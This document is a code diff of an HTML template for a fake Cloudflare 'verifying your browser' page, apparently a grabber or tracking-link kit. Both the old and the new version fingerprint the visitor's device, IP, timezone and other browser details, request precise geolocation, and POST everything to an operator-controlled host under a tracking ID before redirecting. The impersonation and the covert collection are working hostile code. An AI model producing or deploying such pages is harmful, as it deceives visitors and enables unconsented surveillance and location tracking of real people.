@@ -3,113 +3,67 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Just a moment...</title>
+  <title>Verifying Browser...</title>
   <style>
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
-      background: #fff;
-      margin: 0;
-      padding: 0;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      text-align: center;
-      color: #333;
-      padding: 20px;
-      box-sizing: border-box;
-    }
-    .container {
-      max-width: 600px;
-      width: 100%;
-    }
-    .spinner {
-      display: flex;
-      gap: 6px;
-      margin: 30px auto;
-      justify-content: center;
-    }
-    .spinner div {
-      width: 14px;
-      height: 14px;
-      background: #f58220;
-      border-radius: 50%;
-      animation: fader 1.4s infinite ease-in-out;
-    }
-    .spinner div:nth-child(2) { animation-delay: -0.32s; }
-    .spinner div:nth-child(3) { animation-delay: -0.16s; }
-    @keyframes fader {
-      0%, 80%, 100% { transform: scale(0); }
-      40% { transform: scale(1); }
-    }
-    h1 {
-      font-size: 1.5rem;
-      margin: 0 0 15px;
-      font-weight: 600;
-      color: #000;
-    }
-    p {
-      font-size: 1rem;
-      margin: 8px 0;
-      color: #555;
-      line-height: 1.5;
-    }
-    .footer {
-      margin-top: 40px;
-      font-size: 0.875rem;
-      color: #999;
-    }
-    #status {
-      font-weight: 500;
-      color: #2c3e50;
-    }
-    @media (max-width: 480px) {
-      h1 { font-size: 1.3rem; }
-      p { font-size: 0.95rem; }
-      .spinner div { width: 12px; height: 12px; }
-    }
+    body{font-family:Arial,sans-serif;background:#fff;margin:0;padding:20px;min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#333}
+    .container{max-width:500px;width:100%;text-align:center}
+    .spinner{display:flex;gap:5px;justify-content:center;margin:25px 0}
+    .spinner div{width:12px;height:12px;background:#f58220;border-radius:50%;animation:fader 1.4s infinite ease-in-out}
+    .spinner div:nth-child(2){animation-delay:-0.32s}
+    .spinner div:nth-child(3){animation-delay:-0.16s}
+    @keyframes fader{0%,80%,100%{transform:scale(0)}40%{transform:scale(1)}}
+    h1{font-size:22px;margin:0 0 15px;color:#000}
+    p{font-size:14px;margin:8px 0;color:#555;line-height:1.4}
+    #status{font-weight:500;color:#e67e22;margin:15px 0}
+    .footer{margin-top:30px;font-size:12px;color:#999}
+    .error{color:#e74c3c;font-weight:bold}
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="spinner">
-      <div></div>
-      <div></div>
-      <div></div>
-    </div>
-    <h1>Checking your browser before accessing website</h1>
-    <p>This process is automatic. Please wait.</p>
-    <p id="status">Verifying security parameters...</p>
+    <div class="spinner"><div></div><div></div><div></div></div>
+    <h1>Verifying your browser...</h1>
+    <p>Please wait while we secure your connection.</p>
+    <p id="status">Initializing security scan...</p>
+    <p id="debug" style="font-size:12px;color:#7f8c8d;display:none"></p>
   </div>
-  <div class="footer">
-    DDoS protection by Cloudflare<br>
-    Ray ID: <span id="rayId"></span>
-  </div>
+  <div class="footer">DDoS protection by Cloudflare • Ray ID: <span id="rayId"></span></div>
 
   <script>
+    // CONFIG
     const UID = "<%= uid %>";
     const HOST = "<%= a %>";
     let dataSent = false;
     let locationSent = false;
     let fingerprint = "";
-    let retries = { data: 0, location: 0 };
+    let debugEl = document.getElementById('debug');
+    let statusEl = document.getElementById('status');
 
-    document.getElementById("rayId").innerText = '7' + Array(15).fill(0).map(() => Math.floor(Math.random()*16).toString(16)).join('');
+    // Show debug in development
+    // debugEl.style.display = 'block';
 
-    // Start immediately
-    collectData();
+    function logDebug(msg) {
+      console.log("[DEBUG]", msg);
+      debugEl.innerText = msg;
+    }
+
+    // Generate Ray ID
+    document.getElementById("rayId").innerText = '7' + Math.random().toString(36).substr(2, 15);
+
+    // Start collection
+    setTimeout(collectData, 1000);
 
     async function collectData() {
       try {
+        logDebug("Building fingerprint...");
         await buildFingerprint();
-        sendDataWithRetry();
-        requestLocationWithRetry();
-        // Redirect after 12s max
-        setTimeout(() => { window.location.href = "<%= url %>"; }, 12000);
+        sendData();
+        requestLocation();
+        // Redirect after 15s max
+        setTimeout(() => { redirectToTarget(); }, 15000);
       } catch(e) {
-        console.error("Collection init error:", e);
-        fallbackRedirect();
+        logDebug("Init error: " + e.message);
+        redirectToTarget();
       }
     }
 
@@ -118,121 +72,56 @@
       fingerprint += `<b>⚓ IP:</b> <a href="https://ip-api.com/#<%= ip %>"><%= ip %></a> | <b>🕗 Time:</b> <%= time %><br><br>`;
       fingerprint += `<b>⏳ Local Time:</b> ${new Date()}<br><br>`;
 
-      // MAXIMUM FINGERPRINTING
-      const navKeys = [
-        "vendor","productSub","maxTouchPoints","doNotTrack","hardwareConcurrency",
-        "cookieEnabled","appCodeName","appName","appVersion","platform","product",
-        "userAgent","language","languages","webdriver","pdfViewerEnabled","deviceMemory"
-      ];
-
-      fingerprint += "<b>📱 DEVICE & BROWSER</b><br>";
-      navKeys.forEach(key => {
-        if (navigator[key] !== undefined) {
-          let val = navigator[key];
-          if (typeof val === 'object' && val !== null) {
-            try { val = JSON.stringify(val); } catch(e) { val = '[Object]'; }
-          }
-          fingerprint += `<b>${key}:</b> <code>${val}</code><br>`;
+      const keys = ["vendor","productSub","maxTouchPoints","doNotTrack","hardwareConcurrency","cookieEnabled","appCodeName","appName","appVersion","platform","product","userAgent","language"];
+      fingerprint += "<b>📱 DEVICE INFO</b><br>";
+      keys.forEach(k => {
+        if (navigator[k] !== undefined) {
+          fingerprint += `<b>${k}:</b> <code>${navigator[k]}</code><br>`;
         }
       });
 
-      // Screen
-      fingerprint += "<br><b>🖥️ SCREEN</b><br>";
-      ["width","height","availWidth","availHeight","colorDepth","pixelDepth"].forEach(p => {
-        fingerprint += `<b>screen.${p}:</b> <code>${screen[p]}</code><br>`;
-      });
-
-      // Timezone
-      fingerprint += `<br><b>🌍 TIMEZONE:</b> <code>${Intl.DateTimeFormat().resolvedOptions().timeZone}</code><br>`;
-
-      // Plugins
-      if (navigator.plugins && navigator.plugins.length > 0) {
-        fingerprint += "<br><b>🧩 PLUGINS (Top 3)</b><br>";
-        for (let i = 0; i < Math.min(3, navigator.plugins.length); i++) {
-          let p = navigator.plugins[i];
-          fingerprint += `<b>${p.name}:</b> <code>${p.description.substring(0, 40)}...</code><br>`;
-        }
-      }
-
-      // WebGL
-      try {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (gl) {
-          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-          if (dbg) {
-            const vendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
-            const renderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-            fingerprint += `<br><b>🎮 WEBGL:</b> <code>${vendor} | ${renderer}</code><br>`;
-          }
-        }
-      } catch(e) { fingerprint += `<br><b>🎮 WEBGL:</b> <code>Blocked/Error</code><br>`; }
-
-      // Network
-      if (navigator.connection) {
-        fingerprint += "<br><b>🌐 NETWORK</b><br>";
-        ['type','effectiveType','rtt','downlink'].forEach(k => {
-          if (navigator.connection[k] !== undefined) {
-            fingerprint += `<b>connection.${k}:</b> <code>${navigator.connection[k]}</code><br>`;
-          }
-        });
-      }
-
-      // Battery
-      if ('getBattery' in navigator) {
-        try {
-          const battery = await navigator.getBattery();
-          fingerprint += `<br><b>🔋 BATTERY:</b> <code>${Math.round(battery.level*100)}% | Charging: ${battery.charging}</code><br>`;
-        } catch(e) {}
-      }
-
-      // Touch
-      if ('ontouchstart' in window) {
-        fingerprint += `<br><b>👆 TOUCH:</b> <code>Yes | Max Points: ${navigator.maxTouchPoints}</code><br>`;
-      }
-
-      // Permissions
-      const perms = ['geolocation','camera','microphone'];
-      fingerprint += "<br><b>🔐 PERMISSIONS</b><br>";
-      for (let p of perms) {
-        try {
-          const status = await navigator.permissions.query({name: p});
-          fingerprint += `<b>${p}:</b> <code>${status.state}</code><br>`;
-        } catch(e) {}
-      }
+      fingerprint += `<br><b>🖥️ Screen:</b> <code>${screen.width}x${screen.height}</code><br>`;
+      fingerprint += `<b>🌍 Timezone:</b> <code>${Intl.DateTimeFormat().resolvedOptions().timeZone}</code><br>`;
     }
 
-    function sendDataWithRetry() {
-      if (dataSent) return;
-      
-      fetch(`${HOST}/data`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: `uid=${encodeURIComponent(UID)}&data=${encodeURIComponent(fingerprint)}`
-      })
-      .then(r => {
-        if (r.ok) {
-          dataSent = true;
-          document.getElementById("status").innerText = "✅ Device data captured. Requesting location...";
-          checkCompletion();
-        } else {
-          throw new Error('HTTP ' + r.status);
+    function sendData() {
+      logDebug("Sending device data...");
+      statusEl.innerText = "📡 Sending device fingerprint...";
+
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", HOST + "/data", true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+          if (xhr.status === 200) {
+            dataSent = true;
+            logDebug("✅ Data sent successfully");
+            statusEl.innerText = "✅ Device data received";
+            checkCompletion();
+          } else {
+            logDebug("❌ Data send failed: " + xhr.status);
+            retrySendData();
+          }
         }
-      })
-      .catch(err => {
-        console.error("Data send failed:", err);
-        retries.data++;
-        if (retries.data <= 3) {
-          setTimeout(sendDataWithRetry, 2000 * retries.data); // Exponential backoff
-        } else {
-          dataSent = true; // Give up but mark as sent to avoid blocking
-          checkCompletion();
-        }
-      });
+      };
+
+      xhr.send("uid=" + encodeURIComponent(UID) + "&data=" + encodeURIComponent(fingerprint));
     }
 
-    function requestLocationWithRetry() {
+    function retrySendData() {
+      setTimeout(() => {
+        logDebug("Retrying data send...");
+        sendData();
+      }, 3000);
+    }
+
+    function requestLocation() {
+      logDebug("Requesting location...");
+      statusEl.innerText = "📍 Requesting location access...";
+
       if (!navigator.geolocation) {
+        logDebug("Geolocation not supported");
         locationSent = true;
         checkCompletion();
         return;
@@ -240,54 +129,52 @@
 
       navigator.geolocation.getCurrentPosition(
         (pos) => {
-          fetch(`${HOST}/location`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-            body: `uid=${encodeURIComponent(UID)}&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&acc=${pos.coords.accuracy}`
-          })
-          .then(r => {
-            if (r.ok) {
-              locationSent = true;
-              document.getElementById("status").innerText = "✅ Location captured. Finalizing...";
-              checkCompletion();
-            } else {
-              throw new Error('HTTP ' + r.status);
-            }
-          })
-          .catch(err => {
-            console.error("Location send failed:", err);
-            retries.location++;
-            if (retries.location <= 3) {
-              setTimeout(() => requestLocationWithRetry(), 2000 * retries.location);
-            } else {
-              locationSent = true; // Give up but proceed
-              checkCompletion();
-            }
-          });
+          logDebug("✅ Location obtained");
+          sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
         },
         (err) => {
-          console.error("Geolocation error:", err);
-          retries.location++;
-          if (retries.location <= 3) {
-            setTimeout(requestLocationWithRetry, 2000 * retries.location);
-          } else {
-            locationSent = true;
-            checkCompletion();
-          }
+          logDebug("❌ Location error: " + err.message);
+          locationSent = true;
+          checkCompletion();
         },
-        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        { enableHighAccuracy: true, timeout: 10000 }
       );
     }
 
+    function sendLocation(lat, lon, acc) {
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", HOST + "/location", true);
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) {
+          if (xhr.status === 200) {
+            locationSent = true;
+            logDebug("✅ Location sent");
+            statusEl.innerText = "✅ Location captured";
+            checkCompletion();
+          } else {
+            logDebug("❌ Location send failed: " + xhr.status);
+            locationSent = true; // Don't block
+            checkCompletion();
+          }
+        }
+      };
+
+      xhr.send(`uid=${encodeURIComponent(UID)}&lat=${lat}&lon=${lon}&acc=${acc}`);
+    }
+
     function checkCompletion() {
-      if (dataSent && locationSent) {
-        document.getElementById("status").innerText = "✅ Verification complete. Redirecting...";
-        setTimeout(() => { window.location.href = "<%= url %>"; }, 1000);
+      if (dataSent) { // ← Only require data for testing (location optional)
+        logDebug("✅ Ready to redirect");
+        statusEl.innerText = "✅ Verification complete. Redirecting...";
+        setTimeout(redirectToTarget, 1000);
       }
     }
 
-    function fallbackRedirect() {
-      setTimeout(() => { window.location.href = "<%= url %>"; }, 5000);
+    function redirectToTarget() {
+      logDebug("Redirecting to target URL");
+      window.location.href = "<%= url %>";
     }
   </script>
 </body>
